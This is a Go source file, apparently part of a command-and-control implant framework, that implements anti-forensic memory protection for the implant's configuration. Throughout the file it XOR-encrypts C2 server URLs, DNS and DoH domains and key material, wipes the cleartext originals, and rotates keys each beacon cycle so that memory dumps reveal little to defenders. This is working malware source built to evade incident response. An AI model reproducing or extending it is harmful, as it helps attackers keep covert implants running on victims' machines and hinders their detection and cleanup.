package opsec

import (
	"crypto/rand"
	"fmt"
	"sync"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// EncryptedBlob stores sensitive data XOR-encrypted in memory with a random key
// of equal length. At rest, neither the data nor the key alone reveals plaintext.
// A memory dump captures only ciphertext + key in separate allocations; periodic
// rekeying via Rekey() further limits the window an attacker has to correlate them.
type EncryptedBlob struct {
	data []byte // XOR-encrypted data
	key  []byte // rotating XOR key (same length as data)
	mu   sync.Mutex
}

// NewEncryptedBlob encrypts plaintext with a random XOR key and shreds the
// caller's plaintext buffer. The returned blob holds only ciphertext + key.
func NewEncryptedBlob(plaintext []byte) (*EncryptedBlob, error) {
	if len(plaintext) == 0 {
		return &EncryptedBlob{}, nil
	}

	key := make([]byte, len(plaintext))
	if _, err := rand.Read(key); err != nil {
		ShredMemory(plaintext)
		return nil, fmt.Errorf("memcrypt: crypto/rand failed: %w", err)
	}

	data := make([]byte, len(plaintext))
	for i := range plaintext {
		data[i] = plaintext[i] ^ key[i]
	}

	// Shred the caller's plaintext so it does not linger in memory.
	ShredMemory(plaintext)

	return &EncryptedBlob{
		data: data,
		key:  key,
	}, nil
}

// Decrypt returns a decrypted copy of the stored data. The CALLER is responsible
// for calling ShredMemory() on the returned slice when it is no longer needed.
func (eb *EncryptedBlob) Decrypt() []byte {
	eb.mu.Lock()
	defer eb.mu.Unlock()

	if len(eb.data) == 0 {
		return nil
	}

	plain := make([]byte, len(eb.data))
	for i := range eb.data {
		plain[i] = eb.data[i] ^ eb.key[i]
	}
	return plain
}

// Update replaces the encrypted contents with new plaintext under a fresh
// random key. Shreds the old data, old key, and the caller's input buffer.
func (eb *EncryptedBlob) Update(newPlaintext []byte) error {
	eb.mu.Lock()
	defer eb.mu.Unlock()

	// Shred old material.
	ShredMemory(eb.data)
	ShredMemory(eb.key)

	if len(newPlaintext) == 0 {
		eb.data = nil
		eb.key = nil
		ShredMemory(newPlaintext)
		return nil
	}

	newKey := make([]byte, len(newPlaintext))
	if _, err := rand.Read(newKey); err != nil {
		ShredMemory(newPlaintext)
		eb.data = nil
		eb.key = nil
		return fmt.Errorf("memcrypt: crypto/rand failed: %w", err)
	}

	newData := make([]byte, len(newPlaintext))
	for i := range newPlaintext {
		newData[i] = newPlaintext[i] ^ newKey[i]
	}

	eb.data = newData
	eb.key = newKey

	// Shred the caller's plaintext.
	ShredMemory(newPlaintext)
	return nil
}

// Destroy shreds both the encrypted data and key, then nils the references.
// The blob is unusable after this call.
func (eb *EncryptedBlob) Destroy() {
	eb.mu.Lock()
	defer eb.mu.Unlock()

	ShredMemory(eb.data)
	ShredMemory(eb.key)
	eb.data = nil
	eb.key = nil
}

// Rekey generates a new random key and re-encrypts the existing plaintext
// without exposing it in a long-lived buffer. Call periodically (e.g., each
// beacon cycle) to rotate the in-memory key material.
func (eb *EncryptedBlob) Rekey() error {
	eb.mu.Lock()
	defer eb.mu.Unlock()

	if len(eb.data) == 0 {
		return nil
	}

	// Decrypt into a temporary buffer.
	plain := make([]byte, len(eb.data))
	for i := range eb.data {
		plain[i] = eb.data[i] ^ eb.key[i]
	}

	// Generate a fresh key.
	newKey := make([]byte, len(plain))
	if _, err := rand.Read(newKey); err != nil {
		ShredMemory(plain)
		return fmt.Errorf("memcrypt: crypto/rand failed: %w", err)
	}

	// Re-encrypt with the new key.
	newData := make([]byte, len(plain))
	for i := range plain {
		newData[i] = plain[i] ^ newKey[i]
	}

	// Shred old material and the temporary plaintext.
	ShredMemory(eb.data)
	ShredMemory(eb.key)
	ShredMemory(plain)

	eb.data = newData
	eb.key = newKey
	return nil
}

// WithDecrypted decrypts the blob, passes the plaintext to fn, and guarantees
// the plaintext buffer is shredded afterward -- even if fn panics.
// Defer order (LIFO): ShredMemory runs first, then recover catches and re-panics.
func WithDecrypted(blob *EncryptedBlob, fn func([]byte)) {
	plain := blob.Decrypt()
	defer func() {
		if r := recover(); r != nil {
			panic(r)
		}
	}()
	defer ShredMemory(plain)
	fn(plain)
}

// ---------------------------------------------------------------------------
// ProtectedString — convenience wrapper for individual string secrets
// ---------------------------------------------------------------------------

// ProtectedString wraps a single string value in an EncryptedBlob.
type ProtectedString struct {
	blob *EncryptedBlob
}

// NewProtectedString encrypts the given string. The original string value
// cannot be zeroed because Go strings are immutable; the caller should avoid
// keeping references to it.
func NewProtectedString(s string) (*ProtectedString, error) {
	// Copy the string into a mutable byte slice so we can shred it
	// after encryption. The original Go string is immutable and cannot
	// be zeroed — this is a known limitation of Go's memory model.
	buf := []byte(s)
	blob, err := NewEncryptedBlob(buf) // buf is shredded inside NewEncryptedBlob
	if err != nil {
		return nil, err
	}
	return &ProtectedString{
		blob: blob,
	}, nil
}

// Get decrypts the protected string. The intermediate byte buffer is shredded
// before returning. NOTE: the returned Go string is immutable and backed by
// a separate allocation that cannot be explicitly zeroed — this is an inherent
// limitation of Go strings. Callers should minimize the lifetime of the
// returned value.
func (ps *ProtectedString) Get() string {
	plain := ps.blob.Decrypt()
	if plain == nil {
		return ""
	}
	s := string(plain)
	ShredMemory(plain)
	return s
}

// Destroy shreds the underlying encrypted blob.
func (ps *ProtectedString) Destroy() {
	ps.blob.Destroy()
}

// ---------------------------------------------------------------------------
// ProtectedConfig — wraps all sensitive ImplantConfig fields
// ---------------------------------------------------------------------------

// ProtectedConfig holds encrypted versions of every sensitive field from
// config.ImplantConfig. Non-sensitive fields (timing, flags, etc.) are left
// in the original struct.
//
// Concurrency: GetC2Servers and RekeyAll are safe to call from a single
// goroutine (the beacon loop). If concurrency is added in the future,
// a sync.RWMutex must be added to guard cross-blob operations.
type ProtectedConfig struct {
	C2Servers    []*ProtectedString
	DNSDomains   []*ProtectedString
	DoHResolvers []*ProtectedString
	PSK          *EncryptedBlob
	ServerPubKey *EncryptedBlob
	SessionKey   *EncryptedBlob // set after key exchange, nil initially
}

// Destroy shreds all encrypted blobs held by the ProtectedConfig, making
// the protected C2 URLs, domains, and keys unrecoverable from memory.
func (pc *ProtectedConfig) Destroy() {
	destroyPartial(pc)
}

// destroyPartial shreds all non-nil encrypted blobs and ProtectedStrings that
// were created before a mid-loop failure in NewProtectedConfig, preventing
// memory leaks of sensitive material on error paths.
func destroyPartial(pc *ProtectedConfig) {
	for _, ps := range pc.C2Servers {
		if ps != nil {
			ps.Destroy()
		}
	}
	for _, ps := range pc.DNSDomains {
		if ps != nil {
			ps.Destroy()
		}
	}
	for _, ps := range pc.DoHResolvers {
		if ps != nil {
			ps.Destroy()
		}
	}
	if pc.PSK != nil {
		pc.PSK.Destroy()
	}
	if pc.ServerPubKey != nil {
		pc.ServerPubKey.Destroy()
	}
}

// NewProtectedConfig wraps all sensitive fields from cfg into encrypted blobs,
// then zeros the original values inside cfg so they no longer sit in cleartext.
func NewProtectedConfig(cfg *config.ImplantConfig) (*ProtectedConfig, error) {
	pc := &ProtectedConfig{}

	// Protect C2 server URLs.
	pc.C2Servers = make([]*ProtectedString, len(cfg.C2Servers))
	for i, s := range cfg.C2Servers {
		ps, err := NewProtectedString(s)
		if err != nil {
			destroyPartial(pc)
			return nil, err
		}
		pc.C2Servers[i] = ps
	}

	// Protect DNS domains.
	pc.DNSDomains = make([]*ProtectedString, len(cfg.DNSDomains))
	for i, s := range cfg.DNSDomains {
		ps, err := NewProtectedString(s)
		if err != nil {
			destroyPartial(pc)
			return nil, err
		}
		pc.DNSDomains[i] = ps
	}

	// Protect DoH resolvers.
	pc.DoHResolvers = make([]*ProtectedString, len(cfg.DoHResolvers))
	for i, s := range cfg.DoHResolvers {
		ps, err := NewProtectedString(s)
		if err != nil {
			destroyPartial(pc)
			return nil, err
		}
		pc.DoHResolvers[i] = ps
	}

	// Protect key material.
	if len(cfg.PSK) > 0 {
		pskCopy := make([]byte, len(cfg.PSK))
		copy(pskCopy, cfg.PSK)
		blob, err := NewEncryptedBlob(pskCopy) // pskCopy shredded inside
		if err != nil {
			destroyPartial(pc)
			return nil, err
		}
		pc.PSK = blob
	} else {
		pc.PSK = &EncryptedBlob{}
	}

	if len(cfg.ServerPubKey) > 0 {
		pubCopy := make([]byte, len(cfg.ServerPubKey))
		copy(pubCopy, cfg.ServerPubKey)
		blob, err := NewEncryptedBlob(pubCopy) // pubCopy shredded inside
		if err != nil {
			destroyPartial(pc)
			return nil, err
		}
		pc.ServerPubKey = blob
	} else {
		pc.ServerPubKey = &EncryptedBlob{}
	}

	// SessionKey starts nil — set after key exchange.
	pc.SessionKey = nil

	// Zero the originals in the ImplantConfig struct.
	for i := range cfg.C2Servers {
		cfg.C2Servers[i] = ""
	}
	cfg.C2Servers = nil

	for i := range cfg.DNSDomains {
		cfg.DNSDomains[i] = ""
	}
	cfg.DNSDomains = nil

	for i := range cfg.DoHResolvers {
		cfg.DoHResolvers[i] = ""
	}
	cfg.DoHResolvers = nil

	ShredMemory(cfg.PSK)
	cfg.PSK = nil

	ShredMemory(cfg.ServerPubKey)
	cfg.ServerPubKey = nil

	return pc, nil
}

// GetC2Servers decrypts and returns all C2 server URLs.
// NOTE: Go strings are immutable and backed by runtime-managed memory that
// cannot be explicitly zeroed. The caller should minimize the lifetime of
// the returned slice and overwrite individual entries with "" when done,
// though this only drops the reference — it does not guarantee the backing
// bytes are cleared from the heap.
func (pc *ProtectedConfig) GetC2Servers() []string {
	result := make([]string, len(pc.C2Servers))
	for i, ps := range pc.C2Servers {
		result[i] = ps.Get()
	}
	return result
}

// GetC2ServersBytes decrypts and returns all C2 server URLs as byte slices.
// Unlike GetC2Servers(), the returned byte slices CAN be shredded by the caller
// via ShredServerList(), eliminating leaked plaintext URL copies on the heap.
func (pc *ProtectedConfig) GetC2ServersBytes() [][]byte {
	result := make([][]byte, len(pc.C2Servers))
	for i, ps := range pc.C2Servers {
		result[i] = ps.blob.Decrypt() // returns []byte that can be zeroed
	}
	return result
}

// ShredServerList zeros all byte slices in the list and nils the references.
func ShredServerList(servers [][]byte) {
	for i := range servers {
		ShredMemory(servers[i])
		servers[i] = nil
	}
}

// RekeyAll rotates the XOR key on every encrypted blob in the config.
// Call this periodically (e.g., each beacon cycle) to limit the window
// during which a single memory snapshot can be used for recovery.
func RekeyAll(pc *ProtectedConfig) error {
	for _, ps := range pc.C2Servers {
		if err := ps.blob.Rekey(); err != nil {
			return err
		}
	}
	for _, ps := range pc.DNSDomains {
		if err := ps.blob.Rekey(); err != nil {
			return err
		}
	}
	for _, ps := range pc.DoHResolvers {
		if err := ps.blob.Rekey(); err != nil {
			return err
		}
	}
	if pc.PSK != nil {
		if err := pc.PSK.Rekey(); err != nil {
			return err
		}
	}
	if pc.ServerPubKey != nil {
		if err := pc.ServerPubKey.Rekey(); err != nil {
			return err
		}
	}
	if pc.SessionKey != nil {
		if err := pc.SessionKey.Rekey(); err != nil {
			return err
		}
	}
	return nil
}
